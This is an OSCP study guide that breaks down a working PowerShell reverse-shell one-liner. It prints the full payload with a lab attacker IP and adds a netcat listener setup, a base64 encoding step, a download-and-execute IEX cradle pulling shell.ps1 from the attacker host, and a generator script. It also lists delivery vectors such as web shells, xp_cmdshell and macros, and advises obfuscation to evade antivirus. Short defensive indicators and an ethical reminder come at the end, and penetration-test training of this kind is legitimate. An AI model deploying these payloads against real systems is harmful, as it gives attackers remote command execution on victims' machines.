# PowerShell Reverse Shell Command Breakdown

**Category**: Exploits / Shells
**Platform**: Windows
**Technique**: Reverse TCP Shell

## Overview
This document breaks down a complex PowerShell reverse shell one-liner commonly used in penetration testing scenarios. Understanding each component is crucial for OSCP exam preparation.

## The Complete Command

### Template Version (for notes):
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Example with actual values:
```powershell
# Replace $ATTACKER with your Kali IP (e.g., 192.168.45.243)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Component-by-Component Breakdown

### 1. PowerShell Execution Context
```powershell
powershell -c "..."
```
- **Purpose**: Launches PowerShell with a command
- **-c flag**: Execute the command string that follows
- **OSCP Note**: Often used when you have command execution but need PowerShell capabilities

### 2. TCP Client Creation
```powershell
$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',4444)
```
- **Purpose**: Creates TCP connection to attacker's machine
- **Components**:
  - `New-Object`: Creates instance of .NET class
  - `System.Net.Sockets.TCPClient`: .NET class for TCP connections
  - `'$ATTACKER'`: Your Kali box IP (e.g., 192.168.45.243)
  - `4444`: Port where netcat listener waits
- **OSCP Tip**: Always replace $ATTACKER with your VPN subnet IP (192.168.45.x)

### 3. Network Stream Setup
```powershell
$stream = $client.GetStream()
```
- **Purpose**: Gets the network stream for bidirectional communication
- **Function**: Allows reading from and writing to the TCP connection
- **Why needed**: Stream object handles the actual data transfer

### 4. Buffer Initialization
```powershell
[byte[]]$bytes = 0..65535|%{0}
```
- **Purpose**: Creates byte array buffer for incoming data
- **Breakdown**:
  - `[byte[]]`: Declares byte array type
  - `0..65535`: Range operator creating sequence 0 to 65535
  - `|%{0}`: Pipes to ForEach-Object, replacing each with 0
  - Result: 65536-byte array filled with zeros
- **Size reasoning**: 65536 bytes = 64KB, sufficient for most commands

### 5. Main Command Loop
```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
- **Purpose**: Continuously reads commands from attacker
- **Components**:
  - `$stream.Read()`: Reads data from network stream
  - `$bytes`: Buffer to store received data
  - `0`: Starting position in buffer
  - `$bytes.Length`: Maximum bytes to read
  - `$i`: Stores number of bytes actually read
  - `-ne 0`: Continue while data is received (0 = connection closed)

### 6. Command Processing
```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
```
- **Purpose**: Converts received bytes to readable string
- **Process**:
  - Creates ASCII encoding object
  - `.GetString()`: Converts byte array to string
  - `$bytes,0,$i`: From buffer, starting at 0, for $i bytes
- **Result**: Attacker's command as text string

### 7. Command Execution
```powershell
$sendback = (iex $data 2>&1 | Out-String )
```
- **Purpose**: Executes received command and captures output
- **Components**:
  - `iex`: Invoke-Expression (executes string as PowerShell command)
  - `$data`: The command string from attacker
  - `2>&1`: Redirects stderr to stdout (captures errors too)
  - `Out-String`: Converts output to string format
- **Security Note**: This is where arbitrary code execution happens

### 8. Prompt Construction
```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
```
- **Purpose**: Adds PowerShell-style prompt to output
- **Components**:
  - `$sendback`: Command output
  - `'PS '`: PowerShell prompt prefix
  - `(pwd).Path`: Current directory path
  - `'> '`: Prompt suffix
- **User Experience**: Makes shell look like interactive PowerShell

### 9. Response Transmission
```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
```
- **Purpose**: Sends command output back to attacker
- **Steps**:
  1. Convert string to bytes using ASCII encoding
  2. Write bytes to network stream
  3. Flush stream to ensure immediate transmission
- **Critical**: Without flush, output might buffer

### 10. Cleanup
```powershell
$client.Close()
```
- **Purpose**: Closes TCP connection when loop exits
- **When triggered**: When attacker disconnects or Read returns 0
- **Good practice**: Proper resource cleanup

## Reformatted for Readability

### Template Version with Variables:
```powershell
powershell -c "
    # Create TCP connection to attacker machine
    $client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',$PORT);

    # Get network stream for communication
    $stream = $client.GetStream();

    # Initialize 64KB buffer for incoming commands
    [byte[]]$bytes = 0..65535|%{0};

    # Main loop - continues while connection is alive
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {

        # Convert received bytes to string (the command)
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);

        # Execute command and capture output (including errors)
        $sendback = (iex $data 2>&1 | Out-String );

        # Add PowerShell prompt to output
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';

        # Convert response to bytes
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);

        # Send response back to attacker
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    };

    # Close connection when done
    $client.Close()
"
```

### Quick Reference Variables:
- `$ATTACKER`: Your Kali IP address (e.g., 192.168.45.243)
- `$PORT`: Listener port (typically 4444, 443, or 8080)
- `$VICTIM`: Target machine IP (if referencing externally)

## Usage Example for OSCP

### On Attacker Machine (Kali):
```bash
# Set variables for easy reference
export ATTACKER=$(ip addr show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
export PORT=4444

# Start listener
nc -nlvp $PORT
# -n: No DNS resolution
# -l: Listen mode
# -v: Verbose output
# -p: Specify port

# Alternative: Show your IP for manual entry
echo "Your attacker IP: $ATTACKER"
```

### On Target Machine ($VICTIM):
Execute the PowerShell one-liner through available vector:
- Web shell command execution
- SQL injection with xp_cmdshell
- Macro in document
- Scheduled task
- Service creation

Example command after substitution:
```powershell
# Replace $ATTACKER with your actual IP before execution
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);..."
```

## Common Modifications

### 1. Change Connection Parameters
```powershell
# Update IP and port for your environment
TCPClient('$ATTACKER',$PORT)
```

### 2. Base64 Encoded Version
```bash
# Create base64 encoded payload with variables
PAYLOAD="IEX(New-Object System.Net.Sockets.TCPClient('$ATTACKER',$PORT))..."
echo $PAYLOAD | iconv -t UTF-16LE | base64 -w 0
# Then use: powershell -enc [base64_string]
```

### 3. Download and Execute
```powershell
# Alternative: Download script and execute
powershell "IEX(New-Object Net.WebClient).DownloadString('http://$ATTACKER/shell.ps1')"
```

### 4. Quick Variable Substitution Script
```bash
#!/bin/bash
# save as: generate-revshell.sh
ATTACKER=$1
PORT=${2:-4444}
echo "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER',$PORT);[rest of payload]...\""
```

## Detection and Prevention

### Defensive Indicators:
- Outbound TCP connection on non-standard ports
- PowerShell process spawning with encoded commands
- System.Net.Sockets.TCPClient usage
- Invoke-Expression (IEX) execution

### Mitigation Strategies:
- PowerShell Constrained Language Mode
- AppLocker/Software Restriction Policies
- Network segmentation and egress filtering
- PowerShell logging (ScriptBlock logging)
- EDR monitoring for suspicious PowerShell activity

## OSCP Exam Tips

1. **Always test locally first** - Ensure your listener is running
2. **Document the exact command used** - For your report
3. **Consider AV evasion** - May need obfuscation techniques
4. **Have alternatives ready** - This might be blocked
5. **Note the context** - How you achieved code execution matters for scoring

## Troubleshooting

### Connection fails:
- Check firewall rules (both ways)
- Verify IP and port are correct
- Ensure no typos in command
- Test with simple TCP connection first

### No output received:
- Check if PowerShell execution policy blocks it
- Verify 2>&1 is included (to see errors)
- Try simpler command first (whoami)

### Shell dies immediately:
- Often due to AV detection
- Try encoding or obfuscation
- Consider staged payload instead

## Ethical Reminder
This technique should only be used:
- In authorized penetration tests
- On systems you own or have permission to test
- Within legal boundaries and scope
- Never on production systems without written authorization